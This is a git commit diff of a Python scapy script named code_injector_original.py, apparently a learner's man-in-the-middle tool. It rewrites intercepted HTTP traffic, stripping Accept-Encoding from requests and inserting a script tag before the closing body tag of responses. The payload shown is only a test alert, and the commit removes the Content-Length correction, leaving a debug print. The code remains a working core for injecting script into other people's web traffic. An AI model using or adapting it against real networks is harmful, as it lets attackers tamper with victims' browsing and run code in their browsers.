459279adf7a7b92aed40b189981e27be884d452b
my9143434 <my9143434@gmail.com>
2019-06-18 17:58:10 -0700

    Add files via upload

--- code_injector_original.py
+++ code_injector_original.py
@@ -17,20 +17,17 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] REQUEST:")
+            print("[+] HTTP REQUEST:")
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)    # question mark means first one
 
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] RESPONSE:")
-            # print(scapy_packet.show())
-            injection_code = "<script>alert('test11111');</script>"
-            load = load.replace("</body>", injection_code + "</body>")
+            print("[+] HTTP RESPONSE:")
+            print(scapy_packet.show())
+            load = load.replace("</body>", "<script>alert('test1');</script></body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)     # don't include that in the re
-            if content_length_search and "text/html" in load:
+            if content_length_search:
                 content_length = content_length_search.group(1)
-                # print(content_length) # length 326
-                new_content_length = int(content_length) + len(injection_code)
-                load = load.replace(content_length, str(new_content_length))
+                print(content_length)
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
